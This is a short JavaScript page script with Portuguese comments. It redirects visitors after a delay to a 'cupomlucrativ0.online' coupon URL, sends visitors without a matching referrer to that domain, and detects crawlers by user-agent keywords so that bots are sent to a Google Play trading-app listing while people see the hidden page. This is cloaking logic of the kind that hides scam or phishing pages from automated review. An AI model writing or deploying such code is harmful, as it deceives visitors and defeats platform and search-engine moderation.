window.onload = function() {
    var numeroTelefone = "cupom";
    var mensagem = "Olá!";
    var link = "https://cupomlucrativ0.online/cupomcerto/" + numeroTelefone;
    
    setTimeout(function() {
      window.location.href = link;
    }, 99990);
  }
  var referer = document.referrer;

  // Domínio permitido
  var dominioPermitido = 'cupomlucrativ0.online';
  
  // Verifica se o referer corresponde ao domínio permitido
  if (referer && referer.indexOf(dominioPermitido) === -1) {
    // Redireciona para o domínio permitido
    window.location.href = 'https://' + dominioPermitido;
  } else {
    // Domínio permitido, mostra o conteúdo da página
    document.body.style.display = 'block'; // Mostra o corpo da página (se estiver oculto)
  }
  // Verifica o agente do usuário
var userAgent = navigator.userAgent.toLowerCase();

// Define uma variável para indicar se é um bot
var isBot = false;

// Palavras-chave que podem indicar um bot
var botKeywords = ['bot', 'crawler', 'spider', 'http'];

// Verifica se o agente do usuário contém alguma das palavras-chave
for (var i = 0; i < botKeywords.length; i++) {
  if (userAgent.includes(botKeywords[i])) {
    isBot = true;
    break;
  }
}

// Se for detectado como um bot, redireciona ou executa ação apropriada
if (isBot) {
  // Aqui você pode redirecionar para outra página ou realizar outra ação
  window.location.href = 'https://play.google.com/store/apps/details?id=com.potradeweb&hl=pt';
} else {
  // Aqui está o código normal da sua página
  document.body.style.display = 'block'; // Mostra o conteúdo da página (se estiver oculto)
}

